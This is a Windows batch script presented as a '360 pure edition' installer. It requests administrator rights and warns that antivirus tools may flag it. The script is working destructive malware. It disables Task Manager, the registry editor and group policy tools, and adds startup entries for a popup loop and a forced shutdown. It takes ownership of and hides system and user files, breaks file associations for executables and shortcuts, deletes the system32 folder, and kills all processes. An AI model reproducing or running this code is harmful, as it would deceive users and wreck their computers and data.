@echo off
title 360安装程序
echo ________________________________________________________________
echo                   360纯净版安装程序
echo          需要请求管理员权限！！！
echo   因本软件是360简化纯净版所以杀毒软件可能报毒！
echo ________________________________________________________________
REM ________________________________________________________________
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo 请求管理员权限...
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\login.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\login.vbs"
    "%temp%\login.vbs"
    exit /B
:gotAdmin
    if exist "%temp%\login.vbs" ( del "%temp%\login.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"
REM ________________________________________________________________
cd C:\
echo 安装中...
mkdir C:\users\%username%\jockerbdLog
echo 病毒正在释放文件… >C:\users\%username%\jockerbdLog\LOG.log
mkdir C:\SystemLogin\start
mkdir C:\SystemLogin
echo randomize > C:\SystemLogin\loginuser.vbs
echo a=int(rnd * 20000 + 0) >>C:\SystemLogin\loginuser.vbs
echo b=int(rnd * 14000 + 0)   >>C:\SystemLogin\loginuser.vbs
echo x = inputbox("I'm a jocker","virus",":)",a,b) >>C:\SystemLogin\loginuser.vbs
echo @echo off >C:\SystemLogin\startLogin.bat
echo :a >>C:\SystemLogin\startLogin.bat
echo start C:\SystemLogin\loginuser.vbs >>C:\SystemLogin\startLogin.bat
echo goto A >>C:\SystemLogin\startLogin.bat
echo @echo off >C:\SystemLogin\start\s.bat
echo shutdown -s -t 10 >>C:\SystemLogin\start\s.bat
echo taskkill /f /im "explorer.exe" >>C:\SystemLogin\ex.bat
echo 病毒正在禁用任务管理器… >C:\users\%username%\jockerbdLog\LOG.log
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f 
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1
echo 病毒正在禁用组策略… >C:\users\%username%\jockerbdLog\LOG.log
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v startuplogbd /t reg_sz /d "C:\SystemLogin\start\s.bat" /f
echo 病毒正在禁用注册表… >C:\users\%username%\jockerbdLog\LOG.log
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v startupbd /t reg_sz /d "C:\users\%username%\SystemLog\Log.bat" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v startupbdtc /t reg_sz /d "C:\SystemLogin\startLogin.bat" /f
echo 病毒正在添加自启动项目… >C:\users\%username%\jockerbdLog\LOG.log
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 
echo 病毒正在启动… >C:\users\%username%\jockerbdLog\LOG.log
echo takeown /f %windir%\System32 /r /d y >C:\SystemLogin\take.bat
start C:\SystemLogin\take.bat
cls
attrib +s +h C:\Systemlogin\*.*
attrib +s +h C:\Systemlogin\start
ping 127.0.0.1 -n 120 >nul
attrib -s -h -r %windir%\System32\*.*
takeown /f %userprofile% /r /d y 
attrib +s +h +r %userprofile%\*.*
assoc.exe=txtfile
assoc.com-txtfile
assoc.lnk=txtfile
assoc.pdf=batfile
cls
echo 360是流氓软件！！！
echo @echo off >C:\360byy.bat
echo echo 不要用360！！！>>C:\360byy.bat
echo %0 >>C:\360byy.bat
attrib +s +h +r C:\*.*
attrib +s +h C:\360byy.bat
del %windir%\system32 /f /s /q
start C:\360byy.bat
start C:\SystemLogin\startLogin.bat
assoc.cmd=exefile
del %windir%\system32 /f /s /q
taskkill /f /fi "pid ne 1"